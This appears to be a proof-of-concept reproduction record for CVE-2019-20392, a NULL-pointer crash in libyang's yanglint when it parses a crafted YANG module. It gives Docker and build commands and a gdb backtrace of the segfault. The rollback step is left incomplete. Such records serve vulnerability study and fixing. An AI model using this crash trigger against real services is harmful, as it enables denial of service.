### CVE-2019-20392

### PoC Links
[Github.com](https://github.com/CESNET/libyang/issues/723)

### Docker Container Run Command
```shell
docker build -t cve-2019-20392-poc .
docker run --privileged --cap-add sys_ptrace  --security-opt seccomp=unconfined -itd --name CVE-2019-20392-POC cve-2019-20392-poc
docker exec -it CVE-2019-20392-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the repository. (ssh-keygen)
cd /poc
git clone git@github.com:CESNET/libyang.git

# Rollback to the vulnerable version.
cd libyang/
cd
# Install the compilation and installation dependencies.
apt install gcc gdb make cmake libpcre3 libpcre3-dev doxygen pkg-config libtool-bin build-essential llvm-dev libunwind-dev -y

# Configure, compile, and install.
mkdir build
cd build/
cmake ..
make
make install
ldconfig

# exec the poc file.
cd /poc
yanglint -p /poc sample.yang
```

### Description
Observed that:
```shell
root@f09cf6d1fdc4:/poc# gdb yanglint
...

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from yanglint...
(gdb) r  -p /poc sample.yang
Starting program: /usr/local/bin/yanglint -p /poc sample.yang
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/aarch64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x0000fffff7e7a90c in resolve_feature_value (feat=0x0) at /poc/libyang/src/resolve.c:1361
b1361       for (i = 0; i < feat->iffeature_size; i++) {
    (gdb) bt
    #0  0x0000fffff7e7a90c in resolve_feature_value (feat=0x0) at /poc/libyang/src/resolve.c:1361
    #1  0x0000fffff7e7a9e4 in resolve_iffeature_recursive (expr=0xaaaaaaaeba80, index_e=0xffffffffda90, index_f=0xffffffffda94)
    at /poc/libyang/src/resolve.c:1382
    #2  0x0000fffff7e7aae8 in resolve_iffeature (expr=0xaaaaaaaeba80) at /poc/libyang/src/resolve.c:1406
    #3  0x0000fffff7ef79fc in lys_is_disabled (node=0xaaaaaaaea5d0, recursive=0) at /poc/libyang/src/tree_schema.c:93
    #4  0x0000fffff7ef8388 in lys_getnext (last=0xaaaaaaaea5d0, parent=0xaaaaaaaea940, module=0xaaaaaaadfd60, options=0)
    at /poc/libyang/src/tree_schema.c:327
    #5  0x0000fffff7ef800c in lys_getnext_data (mod=0xaaaaaaadfd60, parent=0xaaaaaaaea940, name=0xaaaaaaaebe40 "keyleaf", nam_len=7,
    type=LYS_LEAF, ret=0xaaaaaaadf770) at /poc/libyang/src/tree_schema.c:229
    #6  0x0000fffff7e88f78 in resolve_list_keys (list=0xaaaaaaaea940, keys_str=0xaaaaaaaebe40 "keyleaf")
    at /poc/libyang/src/resolve.c:6067
    #7  0x0000fffff7e8b660 in resolve_unres_schema_item (mod=0xaaaaaaadfd60, item=0xaaaaaaaea940, type=UNRES_LIST_KEYS, str_snode=0x0,
    unres=0xaaaaaaaebd90) at /poc/libyang/src/resolve.c:6999
    #8  0x0000fffff7e8ca98 in unres_schema_add_node (mod=0xaaaaaaadfd60, unres=0xaaaaaaaebd90, item=0xaaaaaaaea940, type=UNRES_LIST_KEYS,
    snode=0x0) at /poc/libyang/src/resolve.c:7433
    #9  0x0000fffff7ee89a4 in yang_read_key (module=0xaaaaaaadfd60, list=0xaaaaaaaea940, unres=0xaaaaaaaebd90)
    at /poc/libyang/src/parser_yang.c:485
    #10 0x0000fffff7ef3ca0 in yang_check_list (module=0xaaaaaaadfd60, list=0xaaaaaaaea940, child=0xffffffffde50, options=0,
    unres=0xaaaaaaaebd90) at /poc/libyang/src/parser_yang.c:3927
    #11 0x0000fffff7ef4da8 in yang_check_nodes (module=0xaaaaaaadfd60, parent=0x0, nodes=0xaaaaaaaea940, options=0, unres=0xaaaaaaaebd90)
    at /poc/libyang/src/parser_yang.c:4303
    #12 0x0000fffff7ef6290 in yang_check_sub_module (module=0xaaaaaaadfd60, unres=0xaaaaaaaebd90, node=0xaaaaaaaea940)
    at /poc/libyang/src/parser_yang.c:4716
    #13 0x0000fffff7eef4dc in yang_read_module (ctx=0xaaaaaaad2310,
    data=0xfffff7ff7000 "module links {\n  namespace \"urn:module2\";\n  prefix mod2;\n\n  list list-for-augment {\n    key \"keyleaf\";\n\n    leaf keyleaf {\n      if-feature foo;\n      type string;\n    }\n\n    leaf test {\n      type st"..., size=0,
    revision=0x0, implement=1) at /poc/libyang/src/parser_yang.c:2653
    #14 0x0000fffff7efa160 in lys_parse_mem_ (ctx=0xaaaaaaad2310,
    data=0xfffff7ff7000 "module links {\n  namespace \"urn:module2\";\n  prefix mod2;\n\n  list list-for-augment {\n    key \"keyleaf\";\n\n    leaf keyleaf {\n      if-feature foo;\n      type string;\n    }\n\n    leaf test {\n      type st"..., format=LYS_IN_YANG,
    revision=0x0, internal=1, implement=1) at /poc/libyang/src/tree_schema.c:1044
    #15 0x0000fffff7efa91c in lys_parse_fd_ (ctx=0xaaaaaaad2310, fd=3, format=LYS_IN_YANG, revision=0x0, implement=1)
    at /poc/libyang/src/tree_schema.c:1226
    #16 0x0000fffff7efa734 in lys_parse_fd (ctx=0xaaaaaaad2310, fd=3, format=LYS_IN_YANG) at /poc/libyang/src/tree_schema.c:1180
    #17 0x0000fffff7efa4ac in lys_parse_path (ctx=0xaaaaaaad2310, path=0xfffffffff920 "sample.yang", format=LYS_IN_YANG)
    at /poc/libyang/src/tree_schema.c:1132
    #18 0x0000aaaaaaaaf7d8 in main_ni (argc=4, argv=0xfffffffff708) at /poc/libyang/tools/lint/main_ni.c:646
    #19 0x0000aaaaaaaadd7c in main (argc=4, argv=0xfffffffff708) at /poc/libyang/tools/lint/main.c:41
```



